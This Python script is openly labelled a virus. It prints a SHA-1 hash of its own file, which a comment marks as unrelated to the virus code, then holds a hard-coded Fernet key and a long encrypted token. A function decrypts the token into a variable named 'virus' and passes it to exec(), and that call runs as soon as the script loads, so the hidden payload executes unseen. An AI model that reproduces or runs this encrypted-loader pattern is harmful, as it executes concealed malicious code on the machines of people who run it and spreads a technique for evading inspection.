import inspect
import os
from cryptography.fernet import Fernet
import hashlib


# ---------------------------------------------------------------------------
# Getting file Hash Unrelated to the virus code
def hash_file(filename):
   h = hashlib.sha1()
   with open(filename,'rb') as file:
       chunk = 0
       while chunk != b'':
           chunk = file.read(1024)
           h.update(chunk)

   return h.hexdigest()

message = hash_file(os.path.basename(__file__))
print("Hash of the file is: ", message)
# End of Hash Code
# ---------------------------------------------------------------------------


def decrypt(token, key):
    fer = Fernet(key)
    virus = fer.decrypt(token).decode()
    exec(virus)

# START
key = "Y1x2diCYlKeB8bu2rudfMiTtq2PKT_LY-eH-MjVPWV0="
token = "gAAAAABj4ypBW326t6qT9U1vUikBRvKqCPZvqj9J-HQmxZnAZ5e-_nYUGzKK0dJYqcGTIV528gjmLH8R-7niHo7rcZRNHO98Ah_MsuLisZ3bPh1jdY1jtHY5Kfb9lYYnUVEXw41NrwQAMIYIaC0hWq5wK9e-FyWYHmfx3SknWU8Hyck02wkMYRU0I8hf4GgrXRp3IcKvyNkYj5vlvosQ930hlTlFMP2a4gPbFdZQRMl_GQWfZUNgRS7CffxC9L8kxtivf41mGvSwT9ovvfr4BEnuwFmjnopuWi51XKYfgZDpA20wEktVx_uxsfMZXBQ5mgSdwxUfvrDBHULyFrU6_RWq6SmQx_q8fiPI-EPSMgbELXVBXOBvI_01o6beFXRTHi-MYVi62_IKmsSLi5Pw7LRRch9UmM3DvhWYXYZ7uLrhjvlORzGBGtV6pt_QvsmWrczb8C8rzxyTSxQGTta6fARTYVTy2-64BC-KaW9_bh9yzAkHQOUvokIww-lizTJBf1yCAh8PigqIQMQx_haKbT9VacJ3zjpIvIEmbCXOpUCBUjYj-C7X8dg_nlGy042aiQUgcae5Xu3tleilCxaAzHvV1aajejWdjtaE6zFGCpwQM5vLUB2Dg5U_SL27hT_M5UkL40xm6pAXKVL-mmPNc55Aj1fU-m6TpHe9iQcx-YmbwPi22KcckislHvE4buwirptj1a5qlYaXwdjRRhJCUO2qXcSALf-KRdShiYq5VF2AKI6OpDeQLBG4ikIdkO6UlIWlgZK4r38ruUwqlCYcLUEpIFdKBtCGITv_erAwl45F5_Do4iKBu39QoBDJVsYfKK8D3fk-1M6Uj2HIn42tCAUlI6xkMfIXbyyLvyPzSWkCKeYNA84ABjZi2t7bae6dkI-Fei5saE7O_eQuM2sk98skvfqBQt6-OVR2asS5-7pDlnLHLiA3O3LOOLrpgfPEJkhbADR85qf0yPBbU5zfm2ogyimf1QBRK5wgteGXxKGP_1JCn0y-H2ae3rE94BCZ1DqNtlHE2LCn41KftB3u1oJ4yJVtqRePQ1Op6GfJFby9J-RYg4BG1at7uD5mMpZct6lIyh9rkuS2SVTUkGdiBc7vXqJ3eRw91riRjrgAGma-y5rafiuOEYLgIMmy8bSpzYurl4u4qsR-sISL-esnzbyvC4rgoUuSoCbElR4ECc_3hY-B6gApT1Z7ARyDpOyZOxbsmPb2agRm"

decrypt(token, key)
